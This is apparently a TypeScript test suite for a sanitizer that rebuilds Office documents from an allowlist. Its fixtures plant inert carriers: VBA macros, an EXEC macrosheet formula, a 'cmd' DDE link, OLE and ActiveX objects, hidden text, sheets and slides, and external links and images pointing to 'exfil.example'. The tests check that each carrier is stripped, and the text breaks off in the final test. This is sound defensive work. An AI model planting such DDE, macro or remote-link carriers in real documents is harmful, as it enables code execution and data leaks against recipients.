/**
 * `ooxmlDisarm` — the OOXML allowlist rebuild (#433 S6; spec §5.3 step 2,
 * review F11 and F12, amendments A1 and A3; pin Z2).
 *
 * The input is an ATTACKER-SUPPLIED document. Every case below is a synthetic
 * package built in `ooxml-fixtures.ts` that plants one carrier — a macro, an
 * external relationship, a hidden run, a hidden sheet, a field code — beside a
 * visible control sentinel, and asserts the carrier is in NO part of the
 * output while the control survives. The control is what stops an empty
 * package passing every "absent" assertion.
 *
 * Each element rule is also exercised inside `mc:Choice` and `mc:Fallback`,
 * and under a prefix other than the conventional one, because the rules match
 * by namespace URI. Each pin names the mutation that turns it red; the PR's
 * mutation table records the run.
 */
import { describe, expect, it, vi } from 'vitest'
import {
  readZip,
  ZipRefusedError,
  XML_LIMITS,
  type ZipRefusal,
} from '@hames-ai/harness-patterns/stash/zip.server'
import {
  DocumentRefusedError,
  flattenDocument,
  sanitizeOptionFor,
} from '@hames-ai/harness-patterns/stash/document-sanitizer.server'
import { ooxmlDisarm } from '../../document/ooxml-disarm.server'
import {
  blob,
  buildPackage,
  CT,
  docx,
  everything,
  inAlternateContent,
  MIME,
  NS,
  para,
  pptx,
  row,
  RT,
  run,
  shape,
  sStyles,
  unpack,
  wNotes,
  wStyles,
  xlsx,
  type Rel,
} from './ooxml-fixtures'

/** The output's entry names, sorted. */
function names(bytes: Uint8Array): string[] {
  return readZip(bytes)
    .map((e) => e.name)
    .sort()
}

async function refusalOf(p: Promise<unknown>): Promise<string> {
  try {
    await p
  } catch (err) {
    if (err instanceof DocumentRefusedError || err instanceof ZipRefusedError) return err.code
    throw err
  }
  throw new Error('expected a refusal')
}

/** Disarm, then assert the carrier is nowhere and the control is still there. */
async function disarmed(
  bytes: Uint8Array,
  mime: string,
  gone: readonly string[],
  kept = 'VISIBLE',
) {
  const out = await ooxmlDisarm(bytes, mime)
  const all = everything(out.bytes)
  for (const g of gone) expect(all, `${g} survived the disarm`).not.toContain(g)
  expect(all, `the control ${kept} was dropped too`).toContain(kept)
  return out
}

const DOCX_STYLES_NORMAL =
  '<w:style w:type="paragraph" w:default="1" w:styleId="Normal"><w:name w:val="Normal"/></w:style>'

// ============================================================================
// The rebuilt package
// ============================================================================

describe('the rebuilt package', () => {
  it('a clean docx keeps its text, removes nothing and counts nothing', async () => {
    const out = await disarmed(docx({ body: para('VISIBLE') }), MIME.docx, [])
    expect(names(out.bytes)).toEqual(['[Content_Types].xml', '_rels/.rels', 'word/document.xml'])
    expect(out.removed).toEqual({})
    expect(out.counted).toEqual({})
  })

  it('reopens through the S5 reader and type check, for all six types', async () => {
    const cases: [Uint8Array, string][] = [
      [docx({ body: para('VISIBLE') }), MIME.docx],
      [docx({ body: para('VISIBLE'), macroEnabled: true }), MIME.docm],
      [
        xlsx({ sheets: [{ name: 'S', xml: `<sheetData>${row(1, ['VISIBLE'])}</sheetData>` }] }),
        MIME.xlsx,
      ],
      [
        xlsx({
          macroEnabled: true,
          sheets: [{ name: 'S', xml: `<sheetData>${row(1, ['VISIBLE'])}</sheetData>` }],
        }),
        MIME.xlsm,
      ],
      [pptx({ slides: [{ shapes: shape('VISIBLE') }] }), MIME.pptx],
      [pptx({ macroEnabled: true, slides: [{ shapes: shape('VISIBLE') }] }), MIME.pptm],
    ]
    for (const [bytes, mimeType] of cases) {
      const convert = vi.fn(async (b64: string) => {
        expect(everything(Buffer.from(b64, 'base64'))).toContain('VISIBLE')
        return 'VISIBLE'
      })
      const doc = await flattenDocument(
        { bytes, filename: 'x', mimeType },
        { convert, disarm: ooxmlDisarm },
      )
      expect(doc.report.mimeType).toBe(mimeType)
      expect(doc.report.hiddenContent).toBe('removed')
      expect(convert).toHaveBeenCalledTimes(1)
    }
  })

  it('is deterministic: the same input gives the same bytes', async () => {
    const bytes = docx({ body: para('VISIBLE'), styles: wStyles(DOCX_STYLES_NORMAL) })
    const a = await ooxmlDisarm(bytes, MIME.docx)
    const b = await ooxmlDisarm(bytes, MIME.docx)
    expect(Buffer.from(a.bytes).equals(Buffer.from(b.bytes))).toBe(true)
  })

  it('writes a fresh package: comments and processing instructions do not survive', async () => {
    const body = `<!-- XMLCOMMENTSENTINEL -->${para('VISIBLE')}<?pi PISENTINEL?>`
    await disarmed(docx({ body }), MIME.docx, ['XMLCOMMENTSENTINEL', 'PISENTINEL'])
  })

  it('escapes what it writes: markup characters in text and attributes round-trip', async () => {
    const body =
      `<w:p><w:r><w:t xml:space="preserve">VISIBLE &amp; &lt;tag&gt; "q" &#10;line</w:t></w:r></w:p>` +
      `<w:p><w:pPr><w:pStyle w:val="a&amp;b&quot;c&#10;d"/></w:pPr></w:p>`
    const out = await ooxmlDisarm(docx({ body }), MIME.docx)
    const doc = unpack(out.bytes).get('word/document.xml')!
    expect(doc).toContain('VISIBLE &amp; &lt;tag&gt; "q" \nline')
    expect(doc).toContain('w:val="a&amp;b&quot;c&#10;d"')
  })

  it('an unwrapped element passes its namespace declarations to its children', async () => {
    const body =
      `<w:p><w:ins w:id="1" w:author="a" xmlns:x="${NS.w}">` +
      `<x:r><x:t>VISIBLE</x:t></x:r></w:ins></w:p>`
    const out = await disarmed(docx({ body }), MIME.docx, [])
    // It parses again (an unbound prefix would be refused) and the wrapper is gone.
    expect(unpack(out.bytes).get('word/document.xml')).not.toContain('w:ins')
  })
})

// ============================================================================
// The part allowlist (spec §5.3 step 2, F11)
// ============================================================================

describe('Z2: the part allowlist — only parts reached through allowlisted relationships', () => {
  it('keeps exactly the allowlisted parts of a docx', async () => {
    const out = await ooxmlDisarm(
      docx({
        body: para('VISIBLE'),
        styles: wStyles(DOCX_STYLES_NORMAL),
        numbering: `<w:numbering xmlns:w="${NS.w}"/>`,
        footnotes: wNotes('footnotes', ''),
        endnotes: wNotes('endnotes', ''),
        docRels: [
          { id: 'rIdTheme', type: RT.theme, target: 'theme/theme1.xml' },
          { id: 'rIdSettings', type: RT.settings, target: 'settings.xml' },
          { id: 'rIdEffects', type: RT.stylesWithEffects, target: 'stylesWithEffects.xml' },
        ],
        parts: [
          {
            name: 'word/theme/theme1.xml',
            type: CT.theme,
            body: `<a:theme xmlns:a="${NS.a}" name="T"/>`,
          },
          {
            name: 'word/settings.xml',
            type: CT.wSettings,
            body: `<w:settings xmlns:w="${NS.w}"/>`,
          },
          {
            name: 'word/stylesWithEffects.xml',
            type: CT.wStyles,
            body: `<w:styles xmlns:w="${NS.w}"/>`,
          },
        ],
      }),
      MIME.docx,
    )
    expect(names(out.bytes)).toEqual([
      '[Content_Types].xml',
      '_rels/.rels',
      'word/_rels/document.xml.rels',
      'word/document.xml',
      'word/endnotes.xml',
      'word/footnotes.xml',
      'word/numbering.xml',
      'word/styles.xml',
      'word/theme/theme1.xml',
    ])
    expect(out.removed.otherParts).toBe(2)
  })

  it('keeps exactly the allowlisted parts of an xlsx', async () => {
    const out = await ooxmlDisarm(
      xlsx({
        sheets: [{ name: 'S', xml: `<sheetData>${row(1, ['VISIBLE'])}</sheetData>` }],
        styles: sStyles({ xfs: ['<xf numFmtId="0" fontId="0" fillId="0"/>'] }),
        sharedStrings: `<sst xmlns="${NS.s}"/>`,
        workbookRels: [{ id: 'rIdTheme', type: RT.theme, target: 'theme/theme1.xml' }],
        parts: [
          {
            name: 'xl/theme/theme1.xml',
            type: CT.theme,
            body: `<a:theme xmlns:a="${NS.a}" name="T"/>`,
          },
        ],
      }),
      MIME.xlsx,
    )
    expect(names(out.bytes)).toEqual([
      '[Content_Types].xml',
      '_rels/.rels',
      'xl/_rels/workbook.xml.rels',
      'xl/sharedStrings.xml',
      'xl/styles.xml',
      'xl/theme/theme1.xml',
      'xl/workbook.xml',
      'xl/worksheets/sheet1.xml',
    ])
  })

  it('keeps exactly the allowlisted parts of a pptx: visible slides and their notes', async () => {
    const out = await ooxmlDisarm(
      pptx({
        slides: [{ shapes: shape('VISIBLE'), notes: 'NOTESVISIBLE' }],
        presentationRels: [
          { id: 'rIdMaster', type: RT.slideMaster, target: 'slideMasters/slideMaster1.xml' },
        ],
        parts: [
          {
            name: 'ppt/slideMasters/slideMaster1.xml',
            type: CT.slideMaster,
            body: `<p:sldMaster xmlns:p="${NS.p}"/>`,
          },
        ],
      }),
      MIME.pptx,
    )
    expect(names(out.bytes)).toEqual([
      '[Content_Types].xml',
      '_rels/.rels',
      'ppt/_rels/presentation.xml.rels',
      'ppt/notesSlides/_rels/notesSlide1.xml.rels',
      'ppt/notesSlides/notesSlide1.xml',
      'ppt/presentation.xml',
      'ppt/slides/_rels/slide1.xml.rels',
      'ppt/slides/slide1.xml',
    ])
    expect(everything(out.bytes)).toContain('NOTESVISIBLE')
  })

  it('drops macros: vbaProject.bin and vbaData.xml from a docm', async () => {
    const out = await disarmed(
      docx({
        macroEnabled: true,
        body: para('VISIBLE'),
        docRels: [{ id: 'rIdVba', type: RT.vbaProject, target: 'vbaProject.bin' }],
        parts: [
          { name: 'word/vbaProject.bin', type: CT.vba, body: blob('MACROSENTINEL') },
          {
            name: 'word/vbaData.xml',
            type: CT.vbaData,
            body: `<wne:vbaSuppData xmlns:wne="http://schemas.microsoft.com/office/word/2006/wordml"><wne:mcds><wne:mcd wne:macroName="VBADATASENTINEL"/></wne:mcds></wne:vbaSuppData>`,
          },
        ],
        extraRels: {
          'word/vbaProject.bin': [{ id: 'rIdData', type: RT.wordVbaData, target: 'vbaData.xml' }],
        },
      }),
      MIME.docm,
      ['MACROSENTINEL', 'VBADATASENTINEL', 'vbaProject', 'vbaData'],
    )
    expect(out.removed.macros).toBe(2)
  })

  it('drops macros from an xlsm and a pptm', async () => {
    const vba = { name: 'xl/vbaProject.bin', type: CT.vba, body: blob('XLMACROSENTINEL') }
    await disarmed(
      xlsx({
        macroEnabled: true,
        sheets: [{ name: 'S', xml: `<sheetData>${row(1, ['VISIBLE'])}</sheetData>` }],
        workbookRels: [{ id: 'rIdVba', type: RT.vbaProject, target: 'vbaProject.bin' }],
        parts: [vba],
      }),
      MIME.xlsm,
      ['XLMACROSENTINEL', 'vbaProject'],
    )
    await disarmed(
      pptx({
        macroEnabled: true,
        slides: [{ shapes: shape('VISIBLE') }],
        presentationRels: [{ id: 'rIdVba', type: RT.vbaProject, target: 'vbaProject.bin' }],
        parts: [{ name: 'ppt/vbaProject.bin', type: CT.vba, body: blob('PPMACROSENTINEL') }],
      }),
      MIME.pptm,
      ['PPMACROSENTINEL', 'vbaProject'],
    )
  })

  it('drops a macrosheet, and the <sheet> that names it', async () => {
    const out = await disarmed(
      xlsx({
        macroEnabled: true,
        sheets: [
          { name: 'S', xml: `<sheetData>${row(1, ['VISIBLE'])}</sheetData>` },
          {
            name: 'MACRONAMESENTINEL',
            macro: true,
            xml: `<sheetData>${row(1, ['=EXEC("XLMSENTINEL")'])}</sheetData>`,
          },
        ],
      }),
      MIME.xlsm,
      ['XLMSENTINEL', 'MACRONAMESENTINEL', 'macrosheet'],
    )
    expect(out.removed.macros).toBe(1)
    expect(out.removed.references).toBe(1)
  })

  it('drops embeddings and OLE objects, part and element', async () => {
    const body =
      para('VISIBLE') +
      `<w:p><w:r><w:object><v:shape id="ole1"><v:imagedata r:id="rIdImg" o:title="OLETITLESENTINEL"/></v:shape>` +
      `<o:OLEObject Type="Embed" ProgID="Package" ShapeID="ole1" r:id="rIdOle"/></w:object></w:r></w:p>`
    const out = await disarmed(
      docx({
        body,
        docRels: [
          { id: 'rIdOle', type: RT.oleObject, target: 'embeddings/oleObject1.bin' },
          { id: 'rIdImg', type: RT.image, target: 'media/image1.png' },
        ],
        parts: [
          { name: 'word/embeddings/oleObject1.bin', type: CT.ole, body: blob('OLESENTINEL') },
          { name: 'word/media/image1.png', type: CT.png, body: blob('PNGSENTINEL') },
        ],
      }),
      MIME.docx,
      ['OLESENTINEL', 'OLETITLESENTINEL', 'OLEObject', 'embeddings/'],
    )
    expect(out.removed.embeddings).toBe(1)
    expect(out.removed.oleObjects).toBe(1)
  })

  it('drops ActiveX controls, part and element', async () => {
    const body =
      para('VISIBLE') +
      `<w:p><w:r><w:object><w:control r:id="rIdCtl" w:name="CTLNAMESENTINEL"/></w:object></w:r></w:p>`
    const out = await disarmed(
      docx({
        body,
        docRels: [{ id: 'rIdCtl', type: RT.control, target: 'activeX/activeX1.xml' }],
        parts: [
          {
            name: 'word/activeX/activeX1.xml',
            type: CT.activeX,
            body: `<ax:ocx xmlns:ax="http://schemas.microsoft.com/office/2006/activeX" ax:classid="AXSENTINEL"/>`,
          },
        ],
      }),
      MIME.docx,
      ['AXSENTINEL', 'CTLNAMESENTINEL', 'activeX'],
    )
    expect(out.removed.activeX).toBe(1)
  })

  it('drops comments in all three formats, parts and markers', async () => {
    const wBody =
      `<w:p><w:commentRangeStart w:id="0"/>${run('VISIBLE')}<w:commentRangeEnd w:id="0"/>` +
      `<w:r><w:commentReference w:id="0"/></w:r></w:p>`
    const w = await disarmed(
      docx({
        body: wBody,
        docRels: [{ id: 'rIdComments', type: RT.comments, target: 'comments.xml' }],
        parts: [
          {
            name: 'word/comments.xml',
            type: CT.wComments,
            body: `<w:comments xmlns:w="${NS.w}"><w:comment w:id="0">${para('WCOMMENTSENTINEL')}</w:comment></w:comments>`,
          },
        ],
      }),
      MIME.docx,
      ['WCOMMENTSENTINEL', 'commentRange', 'commentReference'],
    )
    expect(w.removed.comments).toBe(1)
    expect(w.removed.commentMarkers).toBe(3)

    await disarmed(
      xlsx({
        sheets: [
          {
            name: 'S',
            xml: `<sheetData>${row(1, ['VISIBLE'])}</sheetData><legacyDrawing r:id="rIdVml"/>`,
            rels: [
              { id: 'rIdComments', type: RT.comments, target: '../comments1.xml' },
              { id: 'rIdVml', type: RT.vmlDrawing, target: '../drawings/vmlDrawing1.vml' },
            ],
          },
        ],
        parts: [
          {
            name: 'xl/comments1.xml',
            type: CT.sComments,
            body: `<comments xmlns="${NS.s}"><commentList><comment ref="A1"><text><t>SCOMMENTSENTINEL</t></text></comment></commentList></comments>`,
          },
          {
            name: 'xl/drawings/vmlDrawing1.vml',
            body: `<xml xmlns:v="${NS.v}"><v:shape><v:textbox>VMLSENTINEL</v:textbox></v:shape></xml>`,
          },
        ],
      }),
      MIME.xlsx,
      ['SCOMMENTSENTINEL', 'VMLSENTINEL', 'legacyDrawing'],
    )

    await disarmed(
      pptx({
        slides: [
          {
            shapes: shape('VISIBLE'),
            rels: [{ id: 'rIdComments', type: RT.comments, target: '../comments/comment1.xml' }],
          },
        ],
        parts: [
          {
            name: 'ppt/comments/comment1.xml',
            type: CT.pComments,
            body: `<p:cmLst xmlns:p="${NS.p}"><p:cm authorId="0"><p:text>PCOMMENTSENTINEL</p:text></p:cm></p:cmLst>`,
          },
        ],
      }),
      MIME.pptx,
      ['PCOMMENTSENTINEL'],
    )
  })

  it('drops every external relationship, and the references to it', async () => {
    const body =
      `<w:p><w:hyperlink r:id="rIdLink">${run('VISIBLE')}</w:hyperlink></w:p>` +
      `<w:p><w:r><w:drawing><wp:inline><wp:docPr id="1" name="p"/><a:graphic><a:graphicData uri="x">` +
      `<pic:pic><pic:nvPicPr><pic:cNvPr id="2" name="p"/><pic:cNvPicPr/></pic:nvPicPr>` +
      `<pic:blipFill><a:blip r:link="rIdRemoteImg"/></pic:blipFill></pic:pic>` +
      `</a:graphicData></a:graphic></wp:inline></w:drawing></w:r></w:p>`
    const out = await disarmed(
      docx({
        body,
        styles: wStyles(DOCX_STYLES_NORMAL),
        docRels: [
          {
            id: 'rIdLink',
            type: RT.hyperlink,
            target: 'https://exfil.example/LINKSENTINEL',
            external: true,
          },
          {
            id: 'rIdRemoteImg',
            type: RT.image,
            target: 'https://exfil.example/IMGSENTINEL.png',
            external: true,
          },
          // An allowlisted TYPE does not make an external target a part.
          {
            id: 'rIdRemoteTheme',
            type: RT.theme,
            target: 'https://exfil.example/THEMESENTINEL.xml',
            external: true,
          },
          // A TargetMode that is not `Internal` is not internal.
          {
            id: 'rIdOdd',
            type: RT.numbering,
            target: 'numbering.xml',
            targetMode: 'external',
          },
        ],
        parts: [
          {
            name: 'word/numbering.xml',
            type: CT.wNumbering,
            body: `<w:numbering xmlns:w="${NS.w}"><!-- NUMSENTINEL --></w:numbering>`,
          },
        ],
      }),
      MIME.docx,
      ['LINKSENTINEL', 'IMGSENTINEL', 'THEMESENTINEL', 'exfil.example', 'TargetMode', 'rIdLink'],
    )
    expect(out.removed.externalRelationships).toBe(4)
    // The link's text stays; only its target is gone.
    expect(unpack(out.bytes).get('word/document.xml')).toContain('<w:hyperlink>')
    expect(names(out.bytes)).not.toContain('word/numbering.xml')
  })

  it('drops external links (DDE) and the references to them', async () => {
    await disarmed(
      xlsx({
        sheets: [{ name: 'S', xml: `<sheetData>${row(1, ['VISIBLE'])}</sheetData>` }],
        workbookExtra:
          '<externalReferences><externalReference r:id="rIdExt"/></externalReferences>',
        workbookRels: [
          { id: 'rIdExt', type: RT.externalLink, target: 'externalLinks/externalLink1.xml' },
        ],
        parts: [
          {
            name: 'xl/externalLinks/externalLink1.xml',
            type: CT.externalLink,
            body: `<externalLink xmlns="${NS.s}"><ddeLink ddeService="cmd" ddeTopic="DDESENTINEL"/></externalLink>`,
          },
        ],
      }),
      MIME.xlsx,
      ['DDESENTINEL', 'externalReference r:id', 'externalLinks/'],
    )
  })

  it('drops customXml, customUI, the glossary, embedded fonts and document properties', async () => {
    const out = await disarmed(
      docx({
        body: para('VISIBLE'),
        docRels: [
          { id: 'rIdCx', type: RT.customXml, target: '../customXml/item1.xml' },
          { id: 'rIdGloss', type: RT.glossaryDocument, target: 'glossary/document.xml' },
          { id: 'rIdFonts', type: RT.fontTable, target: 'fontTable.xml' },
        ],
        rootRels: [
          { id: 'rIdUi', type: RT.ui, target: 'customUI/customUI14.xml' },
          { id: 'rIdCore', type: RT.coreProperties, target: 'docProps/core.xml' },
          { id: 'rIdApp', type: RT.extendedProperties, target: 'docProps/app.xml' },
          { id: 'rIdCustom', type: RT.customProperties, target: 'docProps/custom.xml' },
        ],
        parts: [
          { name: 'customXml/item1.xml', body: '<data>CUSTOMXMLSENTINEL</data>' },
          {
            name: 'customUI/customUI14.xml',
            type: CT.customUI,
            body: '<customUI onLoad="CUSTOMUISENTINEL"/>',
          },
          {
            name: 'word/glossary/document.xml',
            type: CT.wGlossary,
            body: `<w:glossaryDocument xmlns:w="${NS.w}"><w:docParts><w:docPart><w:docPartBody>${para('GLOSSARYSENTINEL')}</w:docPartBody></w:docPart></w:docParts></w:glossaryDocument>`,
          },
          {
            name: 'word/fontTable.xml',
            type: CT.wFontTable,
            body: `<w:fonts xmlns:w="${NS.w}" xmlns:r="${NS.r}"><w:font w:name="F"><w:embedRegular r:id="rIdFont"/></w:font></w:fonts>`,
          },
          { name: 'word/fonts/font1.odttf', type: CT.font, body: blob('FONTSENTINEL') },
          {
            name: 'docProps/core.xml',
            type: CT.coreProps,
            body: '<cp:coreProperties xmlns:cp="urn:cp">CORESENTINEL</cp:coreProperties>',
          },
          {
            name: 'docProps/app.xml',
            type: CT.appProps,
            body: '<Properties xmlns="urn:app">APPSENTINEL</Properties>',
          },
          {
            name: 'docProps/custom.xml',
            type: CT.customProps,
            body: '<Properties xmlns="urn:custom">CUSTOMPROPSENTINEL</Properties>',
          },
        ],
        extraRels: {
          'word/fontTable.xml': [{ id: 'rIdFont', type: RT.font, target: 'fonts/font1.odttf' }],
        },
      }),
      MIME.docx,
      [
        'CUSTOMXMLSENTINEL',
        'CUSTOMUISENTINEL',
        'GLOSSARYSENTINEL',
        'FONTSENTINEL',
        'CORESENTINEL',
        'APPSENTINEL',
        'CUSTOMPROPSENTINEL',
      ],
    )
    expect(out.removed).toMatchObject({
      customXml: 1,
      customUI: 1,
      glossary: 1,
      fonts: 1,
      properties: 3,
    })
  })

  it('drops connections, query tables and pivot caches', async () => {
    const out = await disarmed(
      xlsx({
        sheets: [
          {
            name: 'S',
            xml: `<sheetData>${row(1, ['VISIBLE'])}</sheetData><tableParts count="1"><tablePart r:id="rIdTable"/></tableParts>`,
            rels: [{ id: 'rIdTable', type: RT.table, target: '../tables/table1.xml' }],
          },
        ],
        workbookExtra: '<pivotCaches><pivotCache cacheId="1" r:id="rIdPivot"/></pivotCaches>',
        workbookRels: [
          { id: 'rIdConn', type: RT.connections, target: 'connections.xml' },
          {
            id: 'rIdPivot',
            type: RT.pivotCacheDefinition,
            target: 'pivotCache/pivotCacheDefinition1.xml',
          },
        ],
        parts: [
          {
            name: 'xl/connections.xml',
            type: CT.connections,
            body: `<connections xmlns="${NS.s}"><connection id="1" name="CONNSENTINEL"><webPr url="https://exfil.example/"/></connection></connections>`,
          },
          {
            name: 'xl/tables/table1.xml',
            type: CT.table,
            body: `<table xmlns="${NS.s}" id="1" name="T" ref="A1:A1"/>`,
          },
          {
            name: 'xl/queryTables/queryTable1.xml',
            type: CT.queryTable,
            body: `<queryTable xmlns="${NS.s}" name="QUERYSENTINEL" connectionId="1"/>`,
          },
          {
            name: 'xl/pivotCache/pivotCacheDefinition1.xml',
            type: CT.pivotCacheDefinition,
            body: `<pivotCacheDefinition xmlns="${NS.s}"><cacheSource type="external" connectionId="1"/><cacheFields count="1"><cacheField name="PIVOTSENTINEL"/></cacheFields></pivotCacheDefinition>`,
          },
        ],
        extraRels: {
          'xl/tables/table1.xml': [
            { id: 'rIdQuery', type: RT.queryTable, target: '../queryTables/queryTable1.xml' },
          ],
        },
      }),
      MIME.xlsx,
      [
        'CONNSENTINEL',
        'QUERYSENTINEL',
        'PIVOTSENTINEL',
        'exfil.example',
        'tablePart r:id',
        'pivotCache ',
      ],
    )
    expect(out.removed.dataConnections).toBe(3)
  })

  it('drops a part no relationship reaches, and a part reached by a type off the allowlist', async () => {
    await disarmed(
      docx({
        body: para('VISIBLE'),
        docRels: [
          { id: 'rIdHdr', type: RT.header, target: 'header1.xml' },
          { id: 'rIdSettings', type: RT.settings, target: 'settings.xml' },
        ],
        parts: [
          {
            name: 'word/stray.xml',
            type: CT.wStyles,
            body: `<w:styles xmlns:w="${NS.w}">${'<!--x-->'}STRAYSENTINEL</w:styles>`,
          },
          {
            name: 'word/header1.xml',
            type: CT.wHeader,
            body: `<w:hdr xmlns:w="${NS.w}">${para('HEADERSENTINEL')}</w:hdr>`,
          },
          {
            name: 'word/settings.xml',
            type: CT.wSettings,
            body: `<w:settings xmlns:w="${NS.w}"><w:docVars><w:docVar w:name="v" w:val="DOCVARSENTINEL"/></w:docVars></w:settings>`,
          },
        ],
      }),
      MIME.docx,
      ['STRAYSENTINEL', 'HEADERSENTINEL', 'DOCVARSENTINEL', 'headerReference'],
    )
  })

  it('drops a part an allowlisted relationship reaches when its content type is not that role’s', async () => {
    const out = await disarmed(
      docx({
        body: para('VISIBLE'),
        docRels: [{ id: 'rIdStyles', type: RT.styles, target: 'vbaProject.bin' }],
        parts: [{ name: 'word/vbaProject.bin', type: CT.vba, body: blob('MISTYPEDSENTINEL') }],
      }),
      MIME.docx,
      ['MISTYPEDSENTINEL', 'vbaProject'],
    )
    expect(out.removed.macros).toBe(1)
  })
})

// ============================================================================
// Hidden content: dropped (spec §5.3 step 2, F11)
// ============================================================================

describe('Z2: hidden runs — effective vanish, specVanish and webHidden are dropped', () => {
  const styled = (styles: string, body: string) =>
    docx({ body, styles: wStyles(DOCX_STYLES_NORMAL + styles) })

  it('direct w:vanish', async () => {
    const out = await disarmed(
      docx({ body: `<w:p>${run('VISIBLE')}${run('HIDDENSENTINEL', '<w:vanish/>')}</w:p>` }),
      MIME.docx,
      ['HIDDENSENTINEL'],
    )
    expect(out.removed.hiddenRuns).toBe(1)
  })

  it('direct w:specVanish and w:webHidden', async () => {
    await disarmed(
      docx({
        body:
          `<w:p>${run('VISIBLE')}${run('SPECSENTINEL', '<w:specVanish/>')}` +
          `${run('WEBSENTINEL', '<w:webHidden w:val="true"/>')}</w:p>`,
      }),
      MIME.docx,
      ['SPECSENTINEL', 'WEBSENTINEL'],
    )
  })

  it('a direct w:vanish w:val="0" keeps the run, whatever the styles say', async () => {
    const styles =
      '<w:docDefaults><w:rPrDefault><w:rPr><w:vanish/></w:rPr></w:rPrDefault></w:docDefaults>'
    await disarmed(
      styled(
        styles,
        `<w:p>${run('VISIBLE', '<w:vanish w:val="0"/>')}${run('DEFAULTSENTINEL')}</w:p>`,
      ),
      MIME.docx,
      ['DEFAULTSENTINEL'],
    )
  })

  it('inherited through rStyle', async () => {
    const styles =
      '<w:style w:type="character" w:styleId="Ghost"><w:rPr><w:vanish/></w:rPr></w:style>'
    await disarmed(
      styled(
        styles,
        `<w:p>${run('VISIBLE')}${run('RSTYLESENTINEL', '<w:rStyle w:val="Ghost"/>')}</w:p>`,
      ),
      MIME.docx,
      ['RSTYLESENTINEL'],
    )
  })

  it('inherited through basedOn', async () => {
    const styles =
      '<w:style w:type="character" w:styleId="Ghost"><w:rPr><w:vanish/></w:rPr></w:style>' +
      '<w:style w:type="character" w:styleId="Child"><w:basedOn w:val="Ghost"/></w:style>'
    await disarmed(
      styled(
        styles,
        `<w:p>${run('VISIBLE')}${run('BASEDONSENTINEL', '<w:rStyle w:val="Child"/>')}</w:p>`,
      ),
      MIME.docx,
      ['BASEDONSENTINEL'],
    )
  })

  it('a basedOn cycle terminates', async () => {
    const styles =
      '<w:style w:type="character" w:styleId="A"><w:basedOn w:val="B"/></w:style>' +
      '<w:style w:type="character" w:styleId="B"><w:basedOn w:val="A"/><w:rPr><w:vanish/></w:rPr></w:style>'
    await disarmed(
      styled(
        styles,
        `<w:p>${run('VISIBLE')}${run('CYCLESENTINEL', '<w:rStyle w:val="A"/>')}</w:p>`,
      ),
      MIME.docx,
      ['CYCLESENTINEL'],
    )
  })

  it('inherited through pStyle', async () => {
    const styles =
      '<w:style w:type="paragraph" w:styleId="GhostPara"><w:rPr><w:vanish/></w:rPr></w:style>'
    await disarmed(
      styled(
        styles,
        para('VISIBLE') + para('PSTYLESENTINEL', '<w:pPr><w:pStyle w:val="GhostPara"/></w:pPr>'),
      ),
      MIME.docx,
      ['PSTYLESENTINEL'],
    )
  })

  it('inherited from the default paragraph style when a paragraph names none', async () => {
    const styles =
      '<w:style w:type="paragraph" w:default="1" w:styleId="Ghost"><w:rPr><w:vanish/></w:rPr></w:style>' +
      '<w:style w:type="paragraph" w:styleId="Shown"/>'
    await disarmed(
      docx({
        body:
          para('VISIBLE', '<w:pPr><w:pStyle w:val="Shown"/></w:pPr>') + para('DEFAULTPSENTINEL'),
        styles: wStyles(styles),
      }),
      MIME.docx,
      ['DEFAULTPSENTINEL'],
    )
  })

  it('inherited from docDefaults', async () => {
    const styles =
      '<w:docDefaults><w:rPrDefault><w:rPr><w:vanish/></w:rPr></w:rPrDefault></w:docDefaults>'
    await disarmed(
      styled(
        styles,
        `<w:p>${run('VISIBLE', '<w:vanish w:val="false"/>')}${run('DOCDEFAULTSENTINEL')}</w:p>`,
      ),
      MIME.docx,
      ['DOCDEFAULTSENTINEL'],
    )
  })

  it('inherited from a table style, its conditional formatting included', async () => {
    const styles =
      '<w:style w:type="table" w:styleId="GhostTable"><w:tblStylePr w:type="firstRow"><w:rPr><w:vanish/></w:rPr></w:tblStylePr></w:style>'
    const table =
      '<w:tbl><w:tblPr><w:tblStyle w:val="GhostTable"/></w:tblPr><w:tblGrid><w:gridCol/></w:tblGrid>' +
      `<w:tr><w:tc>${para('TABLESENTINEL')}</w:tc></w:tr></w:tbl>`
    await disarmed(styled(styles, para('VISIBLE') + table), MIME.docx, ['TABLESENTINEL'])
  })

  it('a hidden math run', async () => {
    await disarmed(
      docx({
        body: `<w:p>${run('VISIBLE')}<m:oMath><m:r><w:rPr><w:vanish/></w:rPr><m:t>MATHSENTINEL</m:t></m:r></m:oMath></w:p>`,
      }),
      MIME.docx,
      ['MATHSENTINEL'],
    )
  })
})

describe('Z2: hidden sheets and slides', () => {
  it('drops hidden and very hidden sheets: the part, its relationship and its <sheet>', async () => {
    const out = await disarmed(
      xlsx({
        sheets: [
          { name: 'Shown', xml: `<sheetData>${row(1, ['VISIBLE'])}</sheetData>` },
          {
            name: 'HIDDENNAMESENTINEL',
            state: 'hidden',
            xml: `<sheetData>${row(1, ['HIDDENSHEETSENTINEL'])}</sheetData>`,
          },
          {
            name: 'VERYNAMESENTINEL',
            state: 'veryHidden',
            xml: `<sheetData>${row(1, ['VERYHIDDENSENTINEL'])}</sheetData>`,
          },
        ],
      }),
      MIME.xlsx,
      [
        'HIDDENSHEETSENTINEL',
        'VERYHIDDENSENTINEL',
        'HIDDENNAMESENTINEL',
        'VERYNAMESENTINEL',
        'sheet2.xml',
        'sheet3.xml',
      ],
    )
    expect(out.removed.hiddenSheets).toBe(2)
  })

  it('a sheet state other than visible is read as hidden', async () => {
    await disarmed(
      xlsx({
        sheets: [
          { name: 'Shown', state: 'visible', xml: `<sheetData>${row(1, ['VISIBLE'])}</sheetData>` },
          {
            name: 'Odd',
            state: 'HIDDEN',
            xml: `<sheetData>${row(1, ['ODDSTATESENTINEL'])}</sheetData>`,
          },
        ],
      }),
      MIME.xlsx,
      ['ODDSTATESENTINEL'],
    )
  })

  it('drops a show="0" slide, its notes and its <p:sldId>; and a slide <p:sldIdLst> does not list', async () => {
    const out = await disarmed(
      pptx({
        slides: [
          { shapes: shape('VISIBLE'), notes: 'NOTESVISIBLE' },
          { shapes: shape('HIDDENSLIDESENTINEL'), show: '0', notes: 'HIDDENNOTESSENTINEL' },
          { shapes: shape('FALSESLIDESENTINEL'), show: 'false' },
          { shapes: shape('UNLISTEDSENTINEL'), unlisted: true },
        ],
      }),
      MIME.pptx,
      [
        'HIDDENSLIDESENTINEL',
        'HIDDENNOTESSENTINEL',
        'FALSESLIDESENTINEL',
        'UNLISTEDSENTINEL',
        'slide2.xml',
        'slide3.xml',
        'slide4.xml',
